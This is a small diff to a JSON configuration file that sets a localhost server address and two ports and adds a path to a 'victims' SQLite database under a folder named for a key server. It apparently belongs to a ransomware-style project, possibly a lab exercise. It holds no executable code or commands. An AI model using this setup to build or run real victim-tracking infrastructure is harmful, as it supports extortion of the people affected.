@@ -1,5 +1,6 @@
 {
   "server_ip": "localhost",
   "port_server": 8380,
-  "second_port_server": 8381
+  "second_port_server": 8381,
+  "victim_database": "serveur_cles/data/victims.sqlite"
 }
